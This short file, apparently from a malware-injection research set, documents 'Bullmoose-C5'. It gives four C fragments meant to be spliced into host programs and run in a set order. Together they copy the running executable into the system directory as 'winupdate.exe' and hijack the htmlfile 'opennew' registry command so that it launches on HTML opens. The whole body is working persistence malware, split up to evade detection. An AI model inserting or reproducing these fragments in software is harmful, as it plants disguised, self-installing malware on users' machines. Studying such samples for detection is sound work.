# Bullmoose-C5

Bullmoose-C5 is `111432`.

```c
char MyPath[256];
char CpyPath[256];
HKEY Key32;
```

The `*` in `malicious_*` is the order injecting in the host code.

The `*` in `if ((* - order) == 1)` is the order that malicious code should run.

The `*` in `if (unorder == 3)` is the number of repetition.

```c
void malicious_1() {
  pthread_mutex_lock(&mutex);
  if ((1 - order) == 1) {
    unorder++;
    if (unorder == 3) {
      order = 1;
      GetModuleFileName(NULL, MyPath, sizeof(MyPath));
      GetSystemDirectory(CpyPath, sizeof(CpyPath));
    }
  }
  pthread_mutex_unlock(&mutex);
}
```
```c
void malicious_2() {
  pthread_mutex_lock(&mutex);
  if ((4 - order) == 1) {
    order = 4;
    CopyFile(MyPath, CpyPath, FALSE);
    RegSetValueEx(Key32, "", 0, REG_SZ, CpyPath, strlen(CpyPath));
    RegCloseKey(Key32);
  }
  pthread_mutex_unlock(&mutex);
}
```
```c
void malicious_3() {
  pthread_mutex_lock(&mutex);
  if ((3 - order) == 1) {
    order = 3;
    RegOpenKeyEx(HKEY_CLASSES_ROOT, 
      "htmlfile\\shell\\opennew\\command", 0,
      KEY_WRITE, &Key32);
  }
  pthread_mutex_unlock(&mutex);
}
```
```c
void malicious_4() {
  pthread_mutex_lock(&mutex);
  if ((2 - order) == 1) {
    order = 2;
    strcat(CpyPath, "\\winupdate.exe");
    strcat(CpyPath, " %1");
  }
  pthread_mutex_unlock(&mutex);
}
```